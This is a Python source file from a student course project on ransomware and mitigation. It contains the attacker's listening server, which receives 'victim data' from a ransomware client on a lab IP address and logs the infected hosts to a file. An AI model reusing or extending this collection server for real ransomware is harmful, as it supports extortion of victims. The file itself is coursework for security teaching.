"""
Author: Ethan Allis
Class: SEC-440-01
Assignment: Project 3 - Ransomware and Mitigation
Credit to Python Esper for inspiration and assistance.
"""

""" This code is for educational purposes only and should not be duplicated for personal use """

# Import lists
import socket
import time

"""INPUT RANSOMWARE HOST INFO BELOW"""
hostip = '10.0.17.201'
hostport = 9960

# Open socket for receiving victim data
print(f'Creating listening socket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((hostip, hostport))
    print(f'Now listening for connections...')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connection from {addr} established!')
    with conn:
        while True:
            constrictor_data = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(constrictor_data+'\n')
            break
        time.sleep(2)
        print(f'Data received and connection terminated!')
